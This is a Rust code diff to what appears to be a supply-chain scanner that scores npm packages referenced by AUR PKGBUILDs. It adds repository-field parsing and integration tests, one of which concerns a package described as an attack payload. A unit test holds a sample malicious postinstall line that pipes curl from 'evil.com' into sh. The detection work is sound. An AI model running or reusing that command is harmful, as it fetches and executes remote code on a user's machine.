@@ -36,10 +36,24 @@ struct NpmMaintainer {
     name: String,
 }
 
+/// Handles npm's inconsistent repository field (string or object).
 #[derive(Deserialize)]
-struct NpmRepository {
-    #[serde(default)]
-    url: Option<String>,
+#[serde(untagged)]
+enum NpmRepository {
+    String(String),
+    Object {
+        #[serde(default)]
+        url: Option<String>,
+    },
+}
+
+impl NpmRepository {
+    fn url(&self) -> Option<&str> {
+        match self {
+            NpmRepository::String(s) => Some(s.as_str()),
+            NpmRepository::Object { url } => url.as_deref(),
+        }
+    }
 }
 
 #[derive(Deserialize)]
@@ -59,7 +73,7 @@ pub fn fetch_npm_info(pkgbuild_content: &str) -> Option<NpmPackageInfo> {
     let repo_url = registry_data
         .repository
         .as_ref()
-        .and_then(|r| r.url.as_deref())
+        .and_then(|r| r.url())
         .map(|s| s.to_string());
     let scripts = registry_data.scripts.unwrap_or_default();
 
@@ -318,7 +332,6 @@ mod tests {
     /// postinstall script. Verify extract_npm_package_name finds the registry URL.
     #[test]
     fn extracts_from_realistic_malicious_pkgbuild() {
-        // PKGBUILD that downloads an npm tarball with a malicious postinstall script
         let content = r#"pkgname=malware-wrapper
 pkgver=1.0
 pkgrel=1
@@ -344,22 +357,75 @@ package() {
     /// pattern commonly used in compromised NPM packages.
     #[test]
     fn suspicious_postinstall_node_eval() {
-        // Simulate a postinstall script with encoded payload execution
         let info = crate::shared::models::NpmPackageInfo {
             scripts: crate::shared::models::NpmScripts {
                 preinstall: String::new(),
                 install: String::new(),
                 postinstall: "node -e \"require('child_process').exec('curl -s http://evil.com/x|sh')\"".to_string(),
             },
-            maintainer_account_age: 15,  // brand new maintainer
+            maintainer_account_age: 15,
             maintainer_package_count: 1,
             github_repo_exists: false,
             github_stars: 0,
             github_commit_freshness: 365,
         };
-        // Using the npm_suspicion_risk from scoring module
         let risk = crate::shared::scoring::npm_suspicion_risk(&info);
-        // 25 (suspicious cmd: curl, exec, child_process, sh) + 10 (age<90) + 5 (single pkg) + 10 (no repo) = 50, capped at 30
+        // 25 (suspicious cmd) + 10 (age<90) + 5 (single pkg) + 10 (no repo) = 50, capped at 30
         assert_eq!(risk, 30, "Obfuscated node -e postinstall with new maintainer should max out NPM suspicion risk");
+    }
+
+    /// Integration test: fetch real `atomic-lockfile` from npm registry.
+    /// This was the payload package in the 2026-06-12 AUR attack wave.
+    /// Marked #[ignore] since it requires network access.
+    #[test]
+    #[ignore]
+    fn fetch_real_atomic_lockfile() {
+        let content = r#"source=("https://registry.npmjs.org/atomic-lockfile/-/atomic-lockfile-1.0.0.tgz")"#;
+        let info = fetch_npm_info(content);
+        assert!(info.is_some(), "Should return Some for real npm package atomic-lockfile");
+
+        let info = info.unwrap();
+        eprintln!("atomic-lockfile npm info:");
+        eprintln!("  maintainer_account_age: {} days", info.maintainer_account_age);
+        eprintln!("  maintainer_package_count: {}", info.maintainer_package_count);
+        eprintln!("  github_repo_exists: {}", info.github_repo_exists);
+        eprintln!("  github_stars: {}", info.github_stars);
+        eprintln!("  scripts.preinstall: {:?}", info.scripts.preinstall);
+        eprintln!("  scripts.install: {:?}", info.scripts.install);
+        eprintln!("  scripts.postinstall: {:?}", info.scripts.postinstall);
+
+        assert!(info.maintainer_account_age <= 1, "Very recent package should have age <= 1 day");
+        assert_eq!(info.maintainer_package_count, 0, "atomic-lockfile has no listed maintainers");
+        assert!(!info.github_repo_exists, "Repository is a placeholder string, not a real GitHub repo");
+
+        let all_scripts = format!(
+            "{} {} {}",
+            info.scripts.preinstall, info.scripts.install, info.scripts.postinstall
+        );
+        assert!(all_scripts.trim().is_empty(), "atomic-lockfile has no scripts");
+        eprintln!("  combined scripts: '{}'", all_scripts);
+    }
+
+    /// Integration test: fetch a well-known benign npm package (minimist).
+    /// Marked #[ignore] since it requires network access.
+    #[test]
+    #[ignore]
+    fn fetch_real_minimist() {
+        let content = r#"source=("https://registry.npmjs.org/minimist/-/minimist-1.2.8.tgz")"#;
+        let info = fetch_npm_info(content);
+        assert!(info.is_some(), "Should return Some for real npm package minimist");
+
+        let info = info.unwrap();
+        eprintln!("minimist npm info:");
+        eprintln!("  maintainer_account_age: {} days", info.maintainer_account_age);
+        eprintln!("  maintainer_package_count: {}", info.maintainer_package_count);
+        eprintln!("  github_repo_exists: {}", info.github_repo_exists);
+        eprintln!("  github_stars: {}", info.github_stars);
+        eprintln!("  scripts.preinstall: {:?}", info.scripts.preinstall);
+        eprintln!("  scripts.install: {:?}", info.scripts.install);
+        eprintln!("  scripts.postinstall: {:?}", info.scripts.postinstall);
+
+        assert!(info.github_repo_exists, "minimist should have a GitHub repo");
+        assert!(info.github_stars > 0, "minimist should have GitHub stars");
     }
 }
